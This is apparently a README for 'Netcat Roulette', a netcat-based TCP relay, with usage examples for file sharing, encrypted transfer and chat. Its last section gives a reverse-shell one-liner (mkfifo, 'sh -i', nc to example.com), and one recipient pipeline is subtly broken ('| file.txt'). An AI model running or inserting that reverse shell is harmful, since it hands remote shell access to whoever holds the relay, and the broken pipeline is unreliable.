# Netcat Roulette 0.1

A simple server listening on a TCP port to bridge traffic between two or more client sockets.


## Help
```
ncr [--help] [-ruvvvh] [-m <max listeners>] [-t <timeout>] <port>
  -r: round robin mode: send everything to everyone, no connection of 2
  -u: unidirectional stream: when a former receiver sends it's ignored
  -v: verbosity: show more output with each level, up to vvv
  --help / -h: show this help, ignore all other options and exit
  -t <timeout>: close a close connection when nothing is sent for <timeout>
     <timeout> = [<days>d][<hours>h][<minutes>m][<seconds>s]
  -m <max listeners>: max sockets in queue, any more are rejected
```

## Usecases

### Simple Filesharing
```
# Server (at example.com)
./ncr -m 30 -t 5m 1234

# Recipient (must be started before the Sender!)
: | nc example.com 1234 > file.txt

# Sender
nc -q 0 example.com 1234 < file.txt

# ":|" and "-q 0" respectively are necessary for exiting immediately
# after the transfer in some netcat implementations
```

### Advanced Filesharing
```
# Server (at example.com) when multiple recievers are possible
./ncr -r -m 30 -t 5m 1234

# Recipient with Decrytion and Progress Bar
: | nc example.com 1234 | gpg -d | pv | file.txt

# Sender with Encryption and Progress Bar
pv file.txt | gpg -esr myfriend@example.com | nc -q 0 example.com 1234
```

### Silly Chat App
```
# Server (at example.com)
./ncr -r -m 30 1234

# Clients
nc example.com 1234
```

### Reverse Shell
```
# Roulette Server (at example.com), use -r to facilitate reconnects
./ncr 1234

# Machine that wants to access the other one (must be started first unless you use `ncr -r`):
nc example.com 1234

# Machine to be remote controlled
mktemp -u | xargs -I@ sh -c "mkfifo @; sh -i <@ 2>&1 | nc example.com 1234 > @; rm @"
```
